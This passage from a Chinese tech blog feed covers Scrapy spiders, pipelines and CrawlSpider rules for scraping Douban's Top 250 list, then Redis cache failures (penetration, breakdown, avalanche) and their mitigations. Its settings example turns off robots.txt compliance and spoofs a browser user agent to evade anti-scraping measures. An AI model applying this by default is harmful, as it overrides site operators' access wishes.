meta=&#123;<span class="string">&#x27;item2&#x27;</span>: item&#125;)</span><br><span class="line">                num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 翻页操作一</span></span><br><span class="line">        next_url = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/div[2]/span[3]/a/@href&#x27;</span>).get()</span><br><span class="line">        <span class="comment"># 拼接</span></span><br><span class="line">        next_url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span> + next_url</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # 翻页操作二</span></span><br><span class="line">        <span class="comment"># # n_url = response.xpath(&quot;//a[text()=&#x27;后页&gt;&#x27;]/@href&quot;)</span></span><br><span class="line">        <span class="comment"># # 直接使用response携带残缺的url</span></span><br><span class="line">        <span class="comment"># # yield response.follow(n_url, callback=self.parse)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 手动构造请求对象，指定解析起始url的parse方法</span></span><br><span class="line">        <span class="comment"># yield scrapy.Request(next_url, callback=self.parse)   # 数据过多，防止被反爬，先注释掉  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析详情的函数(自定义)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_data</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = response.meta.get(<span class="string">&#x27;item2&#x27;</span>)   <span class="comment"># 或 item = response.meta[&#x27;item2&#x27;]</span></span><br><span class="line">        <span class="comment"># print(item)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取详情简介</span></span><br><span class="line">        <span class="comment"># 有的节点不一样，有些是div/span   有些div/span/span</span></span><br><span class="line">        <span class="comment"># // *[ @ id = &quot;link-report&quot;] / span[1] / text()</span></span><br><span class="line">        <span class="comment"># // *[ @ id = &quot;link-report&quot;] / span[1] / span / text()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># content = response.xpath(&#x27;//*[@id=&quot;link-report&quot;]/span[1]/span/text()&#x27;).get()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># string(path) 方法会提取父标签下的文本内容</span></span><br><span class="line">        <span class="comment"># path  就是父标签的路径</span></span><br><span class="line">        content = response.xpath(<span class="string">&#x27;string(.//*[@id=&quot;link-report&quot;]/span)&#x27;</span>).get()</span><br><span class="line">        <span class="comment"># print(&#x27;详情:&#x27;, content)</span></span><br><span class="line">        item[<span class="string">&#x27;con&#x27;</span>] = content.strip()  <span class="comment"># strip()去除左右两边的空格</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>scrapy.Request()中的常见参数解释</p><div class="table-container"><table><thead><tr><th>参数</th><th>解释</th><th>是否必填</th></tr></thead><tbody><tr><td>url</td><td>请求的url</td><td>是</td></tr><tr><td>callback</td><td>回调函数，用于接收请求后的返回信息，若没指定，则默认为parse()函数</td><td>是</td></tr><tr><td>meta</td><td>方法之间以字典形式传递参数，这个参数一般也可在<code>middlewares</code>中处理</td><td>否</td></tr><tr><td>method</td><td>http请求的方式，默认为GET请求，一般不需要指定。若需要POST请求，建议使用用<code>scrapy.FormRequest()</code></td><td>否</td></tr><tr><td>headers</td><td>dict类型，请求头信息，一般在settings中设置即可，也可在middlewares中设置</td><td>否</td></tr><tr><td>cookies</td><td>dict或list类型，请求的cookie</td><td>否</td></tr><tr><td>dont_filter</td><td>是否开启过滤，默认关闭，开启之后爬取过的url,下一次不会再爬取</td><td>否</td></tr><tr><td>errback</td><td>抛出错误的回调函数并打印出来，错误包括404，超时，DNS错误等</td><td>否</td></tr></tbody></table></div><div class="note success no-icon flat"><p>发送post请求</p><p><code>scrapy.FormRequest(url，callback, formdata)</code></p><p>FormRequest 类为Request的子类，用于POST请求，其他参数与Request一样，其中新增的<code>formdata</code>是dict类型，相当于meta。</p></div><h2 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h2><div class="note info flat"><p>利用管道pipeline来处理（保存）数据</p></div><p><strong>一、在pipelines.py文件中定义对数据的操作</strong></p><ol><li>定义一个管道类</li><li>重写管道类的process_item方法</li><li>process_item方法处理完item之后必须返回给引擎</li><li>定义数据的保存逻辑</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyspiderPipeline</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.file = <span class="built_in">open</span>(<span class="string">&#x27;douban.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="comment"># with open(&#x27;douban250.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line">        <span class="comment">#     f.write(str(item) + &#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 把传递数据的载体item对象转为一个字典</span></span><br><span class="line">        dic = <span class="built_in">dict</span>(item)</span><br><span class="line">        js_data = json.dumps(dic, ensure_ascii=<span class="literal">False</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        self.file.write(js_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.file.close()</span><br></pre></td></tr></table></figure><ul><li>def open_spider(self, spider) —— 爬虫<code>开启</code>时执行一次，可用来<code>打开</code>文件</li><li>def process_item(self, item, spider) ——实现数据的写入操作</li><li>def close_spider(self, spider) —— 爬虫<code>关闭</code>时执行一次，可用来<code>关闭</code>文件</li></ul><p><strong>二、在settings.py 配置启用管道</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用管道配置</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;myspider.pipelines.MyspiderPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过robots规则，直接爬取页面</span></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加User-agent</span></span><br><span class="line"><span class="comment">#USER_AGENT = &#x27;myspider (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加cookie</span></span><br><span class="line">COOKIES_ENABLED = <span class="literal">False</span></span><br><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">  <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>setting.py一般都会将<code>管道配置</code>注释掉，取消注释即可。</p><p>配置项中键为使用的管道类，管道类使用<code>.</code>进行分割，第一个为<code>项目目录</code>，第二个为<code>文件</code>，第三个为<code>定义的管道类</code>。 配置项中值为管道的使用顺序，设置的数值<code>越小越优先执行</code>，该值一般设置为1000以内。</p><h2 id="运行爬虫"><a href="#运行爬虫" class="headerlink" title="运行爬虫"></a>运行爬虫</h2><p>命令：在<strong>项目目录下</strong>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl &lt;爬虫名字&gt;(--nolog)</span><br></pre></td></tr></table></figure><div class="note orange icon flat"><i class="note-icon fas fa-battery-half"></i><p>—-nolog：不显示调试信息，不加即默认显示</p></div><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl douban --nolog</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/运行结果.5s2ykwcn5bk0.jpg" alt="运行结果" style="zoom:67%;" /></p><h2 id="crawlspider爬虫"><a href="#crawlspider爬虫" class="headerlink" title="crawlspider爬虫"></a>crawlspider爬虫</h2><p>回顾之前的代码，有很多一部分时间都寻找下一页的url地址或者内容的url地址上面，而这个过程能更简单吗？</p><p>需求思路：</p><ol><li>从response中提取所有的满足规则的url地址</li><li>自动的构造自己requests请求，发送给引擎</li></ol><p>而<code>crawlspider</code>就可以满足上述需求，能够匹配满足条件的url地址，组装成Reuqest对象后自动发送给引擎， 同时能够指定callback函数，</p><p>即：<u>crawlspider爬虫可以按照规则自动获取连接</u></p><div class="note info no-icon flat"><p>Scrapy框架中分两类爬虫，Spider类和CrawlSpider类。CrawlSpider继承自spider，只不过是在之前的基础上增加了新的功能。可以定义爬取的url的规则，以后scrapy碰到满足条件的url都进行爬取，而不用手动yield Request。</p></div><h2 id="创建crawlspider爬虫并观察爬虫内的默认内容"><a href="#创建crawlspider爬虫并观察爬虫内的默认内容" class="headerlink" title="创建crawlspider爬虫并观察爬虫内的默认内容"></a>创建crawlspider爬虫并观察爬虫内的默认内容</h2><p><strong>一、创建crawlspider爬虫：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider -t crawl douban movie.douban.com</span><br></pre></td></tr></table></figure><p><strong>二、spider中默认生成的内容如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubnSpider</span>(<span class="params">CrawlSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=<span class="string">r&#x27;Items/&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = &#123;&#125;</span><br><span class="line">        <span class="comment">#item[&#x27;domain_id&#x27;] = response.xpath(&#x27;//input[@id=&quot;sid&quot;]/@value&#x27;).get()</span></span><br><span class="line">        <span class="comment">#item[&#x27;name&#x27;] = response.xpath(&#x27;//div[@id=&quot;name&quot;]&#x27;).get()</span></span><br><span class="line">        <span class="comment">#item[&#x27;description&#x27;] = response.xpath(&#x27;//div[@id=&quot;description&quot;]&#x27;).get()</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p><strong>三、观察其与跟普通的scrapy.spider的区别</strong></p><div class="note danger flat"><p>在crawlspider爬虫中，没有parse函数</p></div><p>重点在<code>rules</code>中： </p><ol><li>rules是一个元组或者是列表，包含的是Rule对象</li><li>Rule表示规则，其中包含LinkExtractor，callback和follow等参数 </li><li>LinkExtractor:连接提取器，可以通过<code>正则</code>或者是<code>xpath</code>来进行url地址的匹配 </li><li>callback :表示经过连接提取器提取出来的url地址响应的回调函数，可以没有，没有表示响应不会进行回调函数 的处理 </li><li>follow：连接提取器提取的url地址对应的响应是否还会继续被rules中的规则进行提取，True表示会，Flase表示不会</li></ol><p><strong>四、crawlspider使用的注意点</strong></p><ol><li>除了用命令 <code>scrapy genspider -t crawl &lt;爬虫名&gt;  &lt;allowed_domail&gt;</code>创建一个crawlspider的模板，页可以手动创建</li><li>crawlspider中<code>不能</code>再有以<code>parse</code>为名的数据提取方法，该方法被crawlspider用来实现基础url提取等功能</li><li>Rule对象中LinkExtractor为固定参数，其他callback、follow为可选参数</li><li>不指定callback且follow为True的情况下，满足rules中规则的url还会被继续提取和请求</li><li>如果一个被提取的url满足多个Rule，那么会从rules中选择一个满足匹配条件的Rule执行</li></ol><p><strong>五、crawlspider其他知识点的了解</strong></p><ol><li>链接提取器<code>LinkExtractor</code>的更多常见参数<ul><li>allow：满足括号中的’re’表达式的url会被提取，如果为空，则全部匹配 </li><li>deny：满足括号中的’re’表达式的url不会被提取，优先级高于allow </li><li>allow_domains：会被提取的链接的domains(url范围)，如： [‘hr.tencent.com’, ‘baidu.com’] </li><li>deny_domains：不会被提取的链接的domains(url范围) </li><li>restrict_xpaths：使用xpath规则进行匹配，和allow共同过滤url，即xpath满足的范围内的url地址会被 提取，如： restrict_xpaths=’//div[@class=”pagenav”]’</li></ul></li><li><code>Rule</code>常见参数<ul><li>LinkExtractor：链接提取器，可以通过正则或者是xpath来进行url地址的匹配 </li><li>callback：表示经过连接提取器提取出来的url地址响应的回调函数，可以没有，没有表示响应不会进行回调 函数的处理 </li><li>follow：连接提取器提取的url地址对应的响应是否还会继续被rules中的规则进行提取，默认True表示会， Flase表示不会 </li><li>process_links：当链接提取器LinkExtractor获取到链接列表的时候调用该参数指定的方法，这个自定义方 法可以用来过滤url，且这个方法执行后才会执行callback指定的方法</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis学习笔记（3）</title>
      <link href="/posts/6cb57fa2/"/>
      <url>/posts/6cb57fa2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Redis应用问题"><a href="#Redis应用问题" class="headerlink" title="Redis应用问题"></a>Redis应用问题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>用户的数据一般都是存储于数据库中，数据库的数据是落在磁盘上的，磁盘的读写速度可以说是计算机里硬件中最慢的了。</p><p>当用户的请求，都访问数据库的话，请求数量一上来，数据库很容易就崩溃，所以为了避免用户直接访问数据库，会用<code>Redis</code>作为<code>缓存层</code>。</p><p><code>Redis</code>是内存数据库，将数据库的数据缓存在<code>Redis</code>中，相当于数据缓存在内存中，内存的读写速度比硬盘快好几个数量级，这也大大提高了系统性能。</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/缓存层与存储层.id06cl9w4q8.png" alt="缓存层与存储层" style="zoom: 67%;" /></p><p>引入了缓存层，随之而来的是有关缓存异常的一些问题：<code>缓存穿透</code>、<code>缓存击穿</code>、<code>缓存雪崩</code>、<code>缓存颠簸</code>、<code>缓存预热</code>、<code>缓存降级</code>……而前三个也正是有些企业面试经常考察的问题。</p><h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>缓存层</code>和<code>数据库</code>中<code>都没有</code>的数据，而用户不断发起请求，导致请求在访问缓存时，发现缓存缺失，再去访问数据库，如果从数据库中查不到该数据则不写入缓存，这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存保护后端持久的意义。</p><p>而我们数据库的 id 都是1开始自增上去的，如发起为id值为 -1 的数据或 id 为特别大不存在的数据。这时的用户很可能是攻击者，攻击会导致数据库压力过大，严重会击垮数据库。</p><h3 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h3><ol><li>自身业务代码或者数据出现问题（例如：set 和 get 的key不一致，数据被误删除）</li><li>一些恶意攻击、爬虫等造成大量空命中（爬取线上商城商品数据，超大循环递增商品的ID）</li></ol><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>一、非法请求的限制</strong></p><p>当有大量恶意请求访问不存在的数据时，也会发生缓存穿透，因此在API入口处我们要<code>判断请求参数是否合理，请求参数是否含有非法字符、请求字段是否存在</code>，如果判断出是恶意请求就直接返回错误，避免进一步访问缓存层和数据库。</p><p><strong>二、缓存空对象</strong></p><p>缓存空对象：是指在持久层没有命中的情况下，对key进行set （key,null）</p><p>缓存空对象会有<code>两个问题</code>：</p><p>第一，value为null不代表不占用内存空间，空值做了缓存，意味着缓存层中存了更多的键，需要更多的内存空间，<code>比较有效的方法</code>是针对这类数据设置一个较短的过期时间，让其自动剔除。</p><p>第二，缓存层和存储层的数据会有一段时间窗口的<code>不一致</code>，可能会对业务有一定影响。</p><p>例如过期时间设置为5分钟，如果此时存储层添加了这个数据，那这段时间内就会出现缓存层和存储层数据的不一致，此时可以利用<code>消息系统</code>或者其他方式清除掉缓存层中的空对象</p><p><strong>三、布隆过滤器(Bloom Filter)拦截</strong></p><p>布隆过滤器实际上是一个很长的<code>二进制向量</code>和一系列<code>随机映射函数</code>，其实也可以说是由<code>初始值都为0的位图数组</code>和<code>N个哈希函数</code>两部分组成的。布隆过滤器可以用于检索一个元素是否在一个集合中。</p><p>优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。</p><p>在写入数据库数据时，将存在的key使用布隆过滤器<code>标记一下</code>，然后在用户请求到来时，业务线程确认缓存失效后，可以<code>通过查询布隆过滤器快速判断数据是否存在</code>，如果不存在，就不用通过查询数据库来判断数据是否存在。</p><p>即使发生了缓存穿透，大量请求只会查询<code>Redis</code>和<code>布隆过滤器</code>，而不会查询数据库，这就拦截了很多注定没有结果的查询，降低了数据库的负载，保证了数据库正常运行。</p><p>布隆过滤器会通过<code>3个操作</code>完成标记：</p><ol><li>使用N个哈希函数分别对数据做哈希计算，得到N个哈希值；</li><li>将第一步得到的N个哈希值对位图数组的长度取模，得到每个哈希值在位图数组的对应位置；</li><li>将每个哈希值在位图数组的对应位置的值设置为1；</li></ol><p>举个栗子：假设有一个位图数组长度为 8，哈希函数 3 个的布隆过滤器。<br></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/布隆过滤器例子.4jkr5jfjjme0.png" alt="布隆过滤器例子"></p><p><br>在数据库写入数据 x 后，把数据 x 标记在布隆过滤器时，数据 x 会被 3 个哈希函数分别计算出 3 个哈希值，然后在对这 3 个哈希值对 8 取模，假设取模的结果为 1、4、6，然后把位图数组的第 1、4、6 位置的值设置为 1。<strong>当应用要查询数据 x 是否数据库时，通过布隆过滤器只要查到位图数组的第 1、4、6 位置的值是否全为 1，只要有一个为 0，就认为数据 x 不在数据库中</strong>。</p><p>布隆过滤器由于是基于<code>哈希函数</code>实现查找的，高效查找的同时<code>存在哈希冲突的可能性</code>，比如数据 x 和数据 y 可能都落在第 1、4、6 位置，而事实上，可能数据库中并不存在数据 y，存在误判的情况。</p><p>所以，<strong>查询布隆过滤器说数据存在，并不一定证明数据库中存在这个数据，但是查询到数据不存在，数据库中一定就不存在这个数据</strong>。虽有一定的误识别率，但没有识别错误的情形。</p><div class="note info flat"><p>布隆过滤器适用场景：爬虫系统url去重、垃圾邮件过滤、黑名单….</p></div><h2 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>存在<code>某个</code>热点数据key，例如商城秒杀活动、热搜等等。</p><p>用户<code>大并发集中</code>对这一个<code>key</code>进行访问，<code>缓存层</code>在不停地扛着大并发，而当这个 key 在<code>失效过期</code>的瞬间，<code>持续</code>的<code>大并发</code>就会穿破缓存层，直接访问数据库，此时就像在一个完好无损的桶上凿开了一个洞。</p><p>当发生缓存击穿的时候，数据库的查询压力会倍增，导致大量的请求阻塞。</p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>一、预先设置热点数据</strong></p><p>在Redis高峰访问之前，把一些热点数据提前存入redis中，增加热点数据key的过期时间</p><p><strong>二、实时调整</strong></p><p>现场监控哪些数据被频繁访问，实时调整key的过期时间</p><p><strong>三、永不过期</strong></p><p>不给热点数据设置过期时间，若数据需要更新的话，可以在后台开启一个异步线程，发现过期的 key 直接重写缓存即可</p><p><strong>四、分布式互斥锁</strong></p><p>当业务线程在处理用户请求时，<strong>如果发现访问的数据不在 Redis 里，就加个互斥锁，保证同一时间内只有一个请求来构建缓存</strong>（<u>从数据库读取数据，再将数据更新到 Redis 里</u>），当缓存构建完成后，再释放锁。未能获取互斥锁的请求，要么等待锁释放后重新读取缓存，要么就返回空值或者默认值。</p><p>实现互斥锁的时候，最好<code>设置超时时间</code>，不然第一个请求拿到了锁，然后这个请求发生了某种意外而一直阻塞，一直不释放锁，这时其他请求也一直拿不到锁，整个系统就会出现<code>无响应</code>现象。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setex &lt;key&gt; &lt;second&gt; &lt;value&gt;//上锁并设置过期时间</span><br><span class="line">set &lt;key&gt; &lt;value&gt; nx ex 10//nx: 上锁, ex: 过期时间, 10: 过期时间为10秒</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/互斥锁.75h7xq3fu9c0.png" alt="互斥锁" style="zoom:67%;" /></p><p>优点：较好地降低后端存储负载，并在一致性上做得比较好。</p><p>缺点：当缓存失效的时候，同一时间只有一个线程读数据库然后回写缓存，其他线程都处于阻塞状态。如果是高并发场景，大量线程阻塞会降低吞吐量。</p><div class="note info no-icon flat"><p>关于穿透与击穿的一些小知识<br>学完上面的<code>缓存穿透</code>与<code>缓存击穿</code>，有些人可能时间久了容易忘记（记忆力好的可以忽略），况且两个词字面上看也有点相近（小声bb），于是就去查了一些资料。<br> <code>穿透</code>，本义可指：贯穿，经过，通过；<br><code>击穿</code>，第一联想是击穿电压，电击穿等等，其实大多也是指在<code>高压力下</code>的破坏和穿孔现象。<br>单看两词，意思相近，但主要区别在于所受的<code>环境压力</code>。</p></div><h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>与缓存击穿相似，但区别在于<code>缓存雪崩</code>针对<code>大量key缓存</code>，而<code>缓存击穿则</code>则是针对<code>某个key</code>。</p><p>由于<code>缓存层</code>承载着大量请求，有效地<code>保护</code>了存储层，但是如果<code>缓存层</code>由于某些原因不可用（宕机）或者<code>大量缓存</code>由于<code>过期时间相同</code>在同一时间段失效（大批key失效/热点数据失效），<code>大量请求</code>直接到达存储层，存储层压力过大导致系统雪崩。</p><p>同一时间大面积失效，那一瞬间Redis跟没有一样，那这个数量级别的请求直接打到数据库几乎是<code>灾难性</code>的。</p><h3 id="造成原因-1"><a href="#造成原因-1" class="headerlink" title="造成原因"></a>造成原因</h3><ol><li>大量数据同时过期</li><li>Redis故障宕机</li></ol><h3 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="针对大量数据同时过期"><a href="#针对大量数据同时过期" class="headerlink" title="针对大量数据同时过期"></a>针对大量数据同时过期</h4><p><strong>一、均匀设置过期时间</strong></p><p>预防大面积的 key 同时失效，可以给不同的 key 过期时间加上随机值，让缓存失效的时间点尽量均匀，这样可以保证数据不会在同一时间大面积失效。</p><p><strong>二、分布式互斥锁</strong></p><p>保证同一时间只有一个业务线程更新缓存，未能获取互斥锁的请求，要么等待锁释放后重新读取缓存，要么就返回空值或者默认值。与<code>缓存击穿</code>的措施相似。</p><p><strong>三、双key策略</strong></p><p>对缓存数据可以使用两个 key，一个是<code>主 key，会设置过期时间</code>，一个是<code>备 key，不会设置过期</code>，它们只是 key 不一样，但是 value 值是一样的，相当于给缓存数据做了个副本。</p><p>当业务线程访问不到<code>主 key</code>的缓存数据时，就直接返回<code>备 key</code>的缓存数据，然后在更新缓存的时候，同时<code>更新 主 key 和 备 key 的数据</code>。</p><p><strong>四、后台更新缓存</strong></p><p>业务线程不再负责更新缓存，缓存也不设置有效期，而是<code>让缓存“永久有效”</code>，并将更新缓存的工作<code>交由后台线程定时更新</code>。</p><p>事实上，缓存数据不设置有效期，并不是意味着数据一直能在内存里，因为<code>当系统内存紧张的时候，有些缓存数据会被“淘汰”</code>，而在缓存被“淘汰”到下一次后台定时更新缓存的这段时间内，业务线程读取缓存失败就返回空值，业务的视角就以为是数据丢失了。</p><p>如何解决上面的问题呢？</p><ol><li><p><code>后台线程</code>不仅负责定时更新缓存，而且也负责<code>频繁地检测缓存是否有效</code>，检测到缓存失效了，可能原因是系统紧张而被淘汰的，于是就要马上<code>从数据库读取数据，并更新到缓存</code>。</p><p>这种方式的检测时间间隔不能太长，太长也导致用户获取的数据是一个空值而不是真正的数据，所以检测的间隔最好是<code>毫秒级</code>的，但是总归是有个间隔时间，用户体验一般。</p></li><li><p>在业务线程发现缓存数据失效后（缓存数据被淘汰），<code>通过消息队列发送一条消息通知后台线程更新缓存</code>，后台线程收到消息后，在更新缓存前可以判断缓存是否存在，存在就不执行更新缓存操作；不存在就读取数据库数据，并将数据加载到缓存。</p><p>这种方式相比第一种方式缓存的更新会更及时，用户体验也比较好。</p></li></ol><h4 id="针对Redis故障宕机"><a href="#针对Redis故障宕机" class="headerlink" title="针对Redis故障宕机"></a>针对Redis故障宕机</h4><p><strong>一、服务熔断或请求限流机制</strong></p><p>当Redis故障宕机而导致缓存雪崩问题时，我们可以启动<code>服务熔断</code>机制，<code>暂停业务应用对缓存服务的访问，直接返回错误</code>，不用再继续访问数据库，从而降低对数据库的访问压力，保证数据库系统的正常运行，然后等到 <code>Redis 恢复正常</code>后，再允许业务应用访问缓存服务。</p><p><code>服务熔断机制</code>是保护数据库的正常允许，但是暂停了业务应用访问缓存服务系统，全部业务都<code>无法正常工作</code>。</p><p>为了减少对业务的影响，我们可以启用<code>请求限流</code>机制，只将<code>少部分请求</code>发送到数据库进行处理，再多的请求就在入口直接拒绝服务，等到 Redis 恢复正常并把缓存预热完后，再解除请求限流的机制。</p><p><strong>二、构建Redis缓存高可靠集群</strong></p><p>服务熔断或请求限流机制是<code>缓存雪崩发生后</code>的应对方案，我们最好通过<code>主从节点的方式构建 Redis 缓存高可靠集群</code>。</p><p>如果 Redis 缓存的主节点故障宕机，从节点可以切换成为主节点，继续提供缓存服务，避免了由于 Redis 故障宕机而导致的缓存雪崩问题。</p><h2 id="缓存颠簸"><a href="#缓存颠簸" class="headerlink" title="缓存颠簸"></a>缓存颠簸</h2><p><code>缓存颠簸</code>，也被称为“缓存抖动”，可以看作一种比“雪崩”更轻微的故障，但是也会在一段时间内对系统造成冲击和性能影响，一般是由<code>缓存节点故障</code>导致的。</p><p>业内推荐的做法是通过一致性Hash算法来解决问题。</p><h2 id="缓存预热"><a href="#缓存预热" class="headerlink" 